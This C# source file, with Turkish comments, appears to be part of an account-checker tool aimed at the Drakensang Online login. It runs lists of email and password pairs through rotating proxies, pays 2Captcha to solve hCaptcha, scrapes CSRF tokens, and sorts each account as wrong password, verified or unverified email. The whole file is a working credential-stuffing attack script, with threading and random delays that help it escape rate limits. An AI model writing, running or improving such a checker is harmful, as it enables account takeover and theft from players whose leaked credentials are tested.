using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;
using HtmlAgilityPack;
using CheckerDSO.Models;
using System.Linq;
using System.Text.RegularExpressions;

namespace CheckerDSO.Services
{
    public class CheckerService
    {
        private readonly List<ProxyEntry> _proxies;
        private int _proxyIndex = 0;
        private readonly object _proxyLock = new object();

        // 2Captcha API anahtarı (boş bırakılırsa captcha çözümü atlanır ve Captcha status atanır)
        public string TwoCaptchaApiKey { get; set; } = "";

        public CheckerService(List<ProxyEntry> proxies)
        {
            _proxies = proxies ?? new List<ProxyEntry>();
        }

        private ProxyEntry GetNextProxy()
        {
            if (_proxies == null || _proxies.Count == 0) return null;
            lock (_proxyLock)
            {
                var proxy = _proxies[_proxyIndex];
                _proxyIndex = (_proxyIndex + 1) % _proxies.Count;
                return proxy;
            }
        }

        public async Task CheckAccountAsync(AccountEntry account, CancellationToken token)
        {
            if (account.Status != AccountStatus.Pending) return;

            account.Status = AccountStatus.Checking;
            account.Notes = "Initializing...";

            var proxy = GetNextProxy();

            try
            {
                using var client = HttpService.CreateClient(proxy);

                // ─── ADIM 1: Login sayfasını al, CSRF token ve form action'ı çıkar ───
                account.Notes = "Fetching login page...";
                var getResp = await client.GetAsync("https://www.drakensang.com/en/login", token);
                var getHtml = await getResp.Content.ReadAsStringAsync(token);

                var doc = new HtmlDocument();
                doc.LoadHtml(getHtml);

                // Form action URL'sini al (HTML decode et!)
                string postUrl = "https://www.drakensang.com/en/login";
                var formNode = doc.DocumentNode.SelectSingleNode("//form[@name='bgcdw_login_form']")
                               ?? doc.DocumentNode.SelectSingleNode("//form");
                if (formNode != null)
                {
                    string rawAction = formNode.GetAttributeValue("action", "");
                    string decodedAction = WebUtility.HtmlDecode(rawAction);
                    if (!string.IsNullOrEmpty(decodedAction))
                        postUrl = decodedAction.StartsWith("http")
                            ? decodedAction
                            : "https://www.drakensang.com" + (decodedAction.StartsWith("/") ? decodedAction : "/" + decodedAction);
                }

                // ─── ADIM 2: Sadece giriş formundaki gizli tokenları al ───
                var payload = new List<KeyValuePair<string, string>>();
                if (formNode != null)
                {
                    var hiddenNodes = formNode.SelectNodes(".//input[@type='hidden']");
                    if (hiddenNodes != null)
                    {
                        foreach (var node in hiddenNodes)
                        {
                            string name = node.GetAttributeValue("name", "");
                            string value = node.GetAttributeValue("value", "");
                            if (!string.IsNullOrEmpty(name))
                                payload.Add(new KeyValuePair<string, string>(name, value));
                        }
                    }
                }

                // ─── ADIM 3: hCaptcha çöz ───
                string hCaptchaToken = null;
                if (!string.IsNullOrWhiteSpace(TwoCaptchaApiKey))
                {
                    account.Notes = "Solving captcha (2captcha)...";
                    var solver = new CaptchaSolverService(TwoCaptchaApiKey);
                    hCaptchaToken = await solver.SolveHCaptchaAsync(token);
                }

                if (hCaptchaToken == null)
                {
                    // 2captcha anahtarı yoksa veya çözüm başarısızsa → Captcha olarak işaretle
                    account.Status = AccountStatus.Captcha;
                    account.Notes = "Captcha required (set 2captcha API key)";
                    return;
                }

                // ─── ADIM 4: Credentials ve captcha token'ı payload'a ekle ───
                payload.Add(new KeyValuePair<string, string>("username", account.Email));
                payload.Add(new KeyValuePair<string, string>("password", account.Password));
                payload.Add(new KeyValuePair<string, string>("h-captcha-response", hCaptchaToken));
                payload.Add(new KeyValuePair<string, string>("g-recaptcha-response", hCaptchaToken));

                var formContent = new FormUrlEncodedContent(payload);

                // POST için doğru Origin ayarla (action URL'nin domain'i)
                Uri actionUri = new Uri(postUrl);
                string originDomain = $"{actionUri.Scheme}://{actionUri.Host}";
                client.DefaultRequestHeaders.Referrer = new Uri("https://www.drakensang.com/en/login");
                if (!client.DefaultRequestHeaders.Contains("Origin"))
                    client.DefaultRequestHeaders.Add("Origin", originDomain);

                // ─── ADIM 5: Login POST isteğini gönder ───
                account.Notes = "Logging in...";
                var loginResponse = await client.PostAsync(postUrl, formContent, token);
                var loginContent = await loginResponse.Content.ReadAsStringAsync(token);
                string finalUrl = loginResponse.RequestMessage?.RequestUri?.ToString()?.ToLower() ?? "";

                var loginDoc = new HtmlDocument();
                loginDoc.LoadHtml(loginContent);

                // Hata kutusunu kontrol et (bgcdw_errors_flash)
                var errorFlash = loginDoc.DocumentNode.SelectSingleNode("//div[contains(@class,'bgcdw_errors_flash')]");
                if (errorFlash != null)
                {
                    string errorHtml = errorFlash.InnerHtml.ToLower();
                    // Gerçekten görünür bir li elementi var mı?
                    var errorItems = errorFlash.SelectNodes(".//li");
                    if (errorItems != null && errorItems.Count > 0)
                    {
                        if (errorHtml.Contains("captcha.notsolved") || errorHtml.Contains("captcha"))
                        {
                            account.Status = AccountStatus.Captcha;
                            account.Notes = "Captcha not solved";
                            return;
                        }
                        if (errorHtml.Contains("login_invalidcredentials") ||
                            errorHtml.Contains("wrong password") ||
                            errorHtml.Contains("no account with this") ||
                            errorHtml.Contains("invalidcredentials"))
                        {
                            account.Status = AccountStatus.WrongPass;
                            account.Notes = "Wrong Password";
                            return;
                        }
                    }
                }

                // Cloudflare koruması
                if (loginContent.Contains("prove you are human") || loginContent.Contains("cloudflare-nginx"))
                {
                    account.Status = AccountStatus.Captcha;
                    account.Notes = "Cloudflare / Captcha";
                    return;
                }

                // URL'de açık hata parametresi
                if (finalUrl.Contains("login_invalidcredentials") || finalUrl.Contains("error=bgc.error"))
                {
                    account.Status = AccountStatus.WrongPass;
                    account.Notes = "Wrong Password";
                    return;
                }

                // ─── ADIM 6: Başarılı giriş sonrası accountcenter token'ını çıkar ───
                account.Notes = "Checking email status...";

                // Login sonrası dönen sayfada accountcenter linkini ara
                // Başarılı girişte sayfa içinde sas.bpsecure.com veya accountcenter linki olur
                string accountUrl = null;

                // Pattern 1: accountcenter.bpsecure.com/...?token=XXX
                var acMatch = Regex.Match(loginContent,
                    @"https://accountcenter\.bpsecure\.com/[^""'\s<>]*token=[a-zA-Z0-9_\-\.]+",
                    RegexOptions.IgnoreCase);
                if (acMatch.Success)
                {
                    accountUrl = WebUtility.HtmlDecode(acMatch.Value);
                }

                // Pattern 2: href içindeki accountcenter linki
                if (accountUrl == null)
                {
                    var hrefMatch = Regex.Match(loginContent,
                        @"href=""(https://accountcenter\.bpsecure\.com/[^""]+)""",
                        RegexOptions.IgnoreCase);
                    if (hrefMatch.Success)
                        accountUrl = WebUtility.HtmlDecode(hrefMatch.Groups[1].Value);
                }

                // Pattern 3: JavaScript içindeki redirect
                if (accountUrl == null)
                {
                    var jsMatch = Regex.Match(loginContent,
                        @"window\.location[^=]*=\s*[""'](https://accountcenter\.bpsecure\.com/[^""']+)[""']",
                        RegexOptions.IgnoreCase);
                    if (jsMatch.Success)
                        accountUrl = jsMatch.Groups[1].Value;
                }

                if (string.IsNullOrEmpty(accountUrl))
                {
                    // Token bulunamadı → giriş başarısız
                    account.Status = AccountStatus.WrongPass;
                    account.Notes = "Wrong Password (Login failed)";
                    return;
                }

                // AccountCenter URL'sine /Settings/Password ekle (email doğrulama uyarısı burada olur)
                try
                {
                    var ub = new UriBuilder(accountUrl)
                    {
                        Path = "/Settings/Password"
                    };
                    accountUrl = ub.ToString();
                }
                catch { /* URL değiştirme başarısız olursa orijinali kullan */ }

                // ─── ADIM 7: AccountCenter'dan email durumunu oku ───
                var manageResp = await client.GetAsync(accountUrl, token);
                var manageHtml = await manageResp.Content.ReadAsStringAsync(token);
                string htmlLower = manageHtml.ToLower();

                // AccountCenter'da "not authenticated" mesajı varsa giriş tokeni geçersiz
                if (htmlLower.Contains("you are not authenticated") || htmlLower.Contains("not authenticated for this service"))
                {
                    account.Status = AccountStatus.WrongPass;
                    account.Notes = "Wrong Password (Auth failed)";
                    return;
                }

                // Email doğrulanmamış uyarısı
                if (htmlLower.Contains("confirm e-mail address") ||
                    htmlLower.Contains("confirm your e-mail") ||
                    htmlLower.Contains("confirm e&#45;mail") ||
                    htmlLower.Contains("complete 2 steps") ||
                    htmlLower.Contains("verify your email") ||
                    htmlLower.Contains("e-mail address provided is correct") ||
                    htmlLower.Contains("check if the e-mail") ||
                    htmlLower.Contains("unverified"))
                {
                    account.Status = AccountStatus.Unverified;
                    account.Notes = "Email Unverified";
                }
                else
                {
                    account.Status = AccountStatus.Verified;
                    account.Notes = "Email Verified";
                }
            }
            catch (TaskCanceledException)
            {
                account.Status = AccountStatus.Pending;
                account.Notes = "Cancelled";
            }
            catch (HttpRequestException ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Http Error: {ex.Message}";
            }
            catch (Exception ex)
            {
                account.Status = AccountStatus.Error;
                account.Notes = $"Error: {ex.Message}";
            }
            finally
            {
                await Task.Delay(new Random().Next(500, 1500), CancellationToken.None);
            }
        }

        public async Task StartCheckingAsync(IEnumerable<AccountEntry> accounts, int maxThreads, IProgress<int> progress, CancellationToken token)
        {
            var semaphore = new SemaphoreSlim(maxThreads);
            var tasks = new List<Task>();

            foreach (var account in accounts.Where(a => a.Status == AccountStatus.Pending))
            {
                token.ThrowIfCancellationRequested();
                await semaphore.WaitAsync(token);

                var t = Task.Run(async () =>
                {
                    try { await CheckAccountAsync(account, token); }
                    finally { semaphore.Release(); progress?.Report(1); }
                }, token);

                tasks.Add(t);
            }

            await Task.WhenAll(tasks);
        }
    }
}